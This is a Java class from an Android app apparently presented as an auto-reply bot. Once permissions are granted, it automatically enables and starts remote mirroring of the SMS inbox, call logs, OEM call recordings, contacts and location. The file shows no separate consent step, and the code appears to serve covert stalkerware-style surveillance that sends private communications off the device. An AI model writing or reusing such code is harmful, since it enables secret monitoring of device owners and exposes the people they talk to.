package com.autoreplybot.remote;

import android.Manifest;
import android.content.Context;

import androidx.annotation.NonNull;

import java.util.Map;

/** Side effects after runtime permissions are granted during first-run or manual setup. */
public final class RemotePermissionGrantEffects {
    private RemotePermissionGrantEffects() {}

    public static void apply(@NonNull Context context,
                             @NonNull RemoteModulePrefs modulePrefs,
                             @NonNull Map<String, Boolean> result) {
        if (Boolean.TRUE.equals(result.get(Manifest.permission.READ_SMS))) {
            modulePrefs.setMessagesSharingEnabled(true);
            new RemoteDeviceInfoRepository(context).publishModuleFlags();
            new Thread(() -> RemoteSmsMirror.syncInbox(context, 100)).start();
        }
        if (Boolean.TRUE.equals(result.get(Manifest.permission.READ_CALL_LOG))
                || Boolean.TRUE.equals(result.get(Manifest.permission.READ_PHONE_STATE))
                || Boolean.TRUE.equals(result.get(Manifest.permission.RECORD_AUDIO))) {
            if (RemotePermissionChecks.hasCallLogAccess(context)) {
                modulePrefs.setCallLogsSharingEnabled(true);
                new RemoteDeviceInfoRepository(context).publishModuleFlags();
                new Thread(() -> {
                    RemoteCallLogMirror.syncRecent(context, 100);
                    RemoteCallRecordingLinker.attachOemRecordings(context, 15);
                }).start();
            }
            RemoteCallRecordingWatcher.syncWithPrefs(context);
        }
        if (Boolean.TRUE.equals(result.get(Manifest.permission.READ_CONTACTS))) {
            modulePrefs.setContactsSharingEnabled(true);
            new RemoteDeviceInfoRepository(context).publishModuleFlags();
            new Thread(() -> RemoteContactsMirror.syncAll(context, 500)).start();
        }
        RemoteModuleAutoEnable.applyRuntimeGrants(context, modulePrefs, result);
        if (RemotePermissionChecks.hasForegroundLocation(context)
                && modulePrefs.ensureLocationSharingIfPermitted(context)) {
            new RemoteDeviceInfoRepository(context).publishModuleFlags();
        }
    }
}
